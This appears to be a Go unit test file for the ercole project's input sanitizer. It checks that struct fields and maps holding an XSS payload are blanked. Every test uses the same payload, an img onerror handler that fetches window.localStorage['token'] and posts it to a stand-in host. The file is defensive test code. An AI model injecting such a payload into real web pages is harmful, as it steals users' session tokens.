// Copyright (c) 2022 Sorint.lab S.p.A.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package sanitizer

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/ercole-io/ercole/v2/logger"
	"github.com/ercole-io/ercole/v2/model"
)

func TestSanitizer_Struct_FieldString(t *testing.T) {
	s := NewSanitizer(logger.NewLogger("TEST"))

	hd := model.HostDataBE{
		Hostname: "<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>",
	}

	hdi, err := s.Sanitize(hd)
	assert.Nil(t, err)

	hd, ok := hdi.(model.HostDataBE)
	assert.True(t, ok)
	assert.Equal(t, "", hd.Hostname)
}

func TestSanitizer_Struct_FieldStruct(t *testing.T) {
	s := NewSanitizer(logger.NewLogger("TEST"))

	hd := model.HostDataBE{
		Info: model.Host{
			Hostname: "<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>",
		},
	}

	hdi, err := s.Sanitize(hd)
	assert.Nil(t, err)

	hd, ok := hdi.(model.HostDataBE)
	assert.True(t, ok)
	assert.Equal(t, "", hd.Info.Hostname)
}

func TestSanitizer_Struct_FieldMap(t *testing.T) {
	s := NewSanitizer(logger.NewLogger("TEST"))

	before := struct {
		Test  map[string]interface{}
		Test2 map[string]string
	}{
		Test: map[string]interface{}{
			"bad":  "<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>",
			"good": "good",
		},
		Test2: map[string]string{
			"bad":  "<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>",
			"good": "good",
		},
	}

	afterInt, err := s.Sanitize(before)
	assert.Nil(t, err)

	after, ok := afterInt.(struct {
		Test  map[string]interface{}
		Test2 map[string]string
	})

	assert.True(t, ok)
	assert.Equal(t, "", after.Test["bad"])
	assert.Equal(t, "good", after.Test["good"])
	assert.Equal(t, "", after.Test2["bad"])
	assert.Equal(t, "good", after.Test2["good"])
}

func TestSanitizer_PointerToStruct_FieldString(t *testing.T) {
	s := NewSanitizer(logger.NewLogger("TEST"))

	before := model.HostDataBE{
		Hostname: "<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>",
	}

	inter, err := s.Sanitize(&before)
	assert.Nil(t, err)

	after, ok := inter.(*model.HostDataBE)
	require.True(t, ok)
	assert.Equal(t, "", after.Hostname)
}

func TestSanitizer_MapStringString(t *testing.T) {
	s := NewSanitizer(logger.NewLogger("TEST"))

	before := map[string]string{
		"bad":  "<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>",
		"good": "good",
	}

	inter, err := s.Sanitize(before)
	assert.Nil(t, err)

	after, ok := inter.(map[string]string)
	require.True(t, ok)
	assert.Equal(t, "", after["bad"])
	assert.Equal(t, "good", after["good"])
}

func TestSanitizer_MapStringInterface(t *testing.T) {
	s := NewSanitizer(logger.NewLogger("TEST"))

	before := map[string]interface{}{
		"bad":  "<img src=nope onerror=fetch('https://somewebsite',{method:'POST',mode:'no-cors',body:window.localStorage['token']});>",
		"good": "good",
	}
	inter, err := s.Sanitize(before)
	assert.Nil(t, err)

	after, ok := inter.(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, "", after["bad"])
	assert.Equal(t, "good", after["good"])
}
